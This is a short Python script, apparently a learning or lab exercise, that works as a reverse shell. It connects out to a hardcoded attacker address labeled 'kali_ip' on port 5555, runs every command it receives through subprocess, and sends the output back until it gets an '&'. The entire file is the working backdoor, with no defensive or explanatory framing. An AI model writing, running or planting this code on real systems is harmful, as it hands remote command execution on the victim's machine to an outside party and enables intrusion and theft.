import socket
import subprocess
kali_ip = "192.168.50.197"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_ip, 5555))
s.send("Connected!\n".encode())
received_data = 0
while received_data != "&":
	received_data = s.recv(1024).decode().replace('\n', '')
	if received_data == "&":
		s.close()
		break
	#print(type(received_data))
	#print(received_data)
	command = subprocess.run(received_data, capture_output=True , text=True)
	output = command.stdout.strip().split('\n')
	#print(output)
	for i in output:
		s.send((i +'\n' ).encode())
	#s.send((output +'\n' ).encode())
	#print(received_data)

s.close()
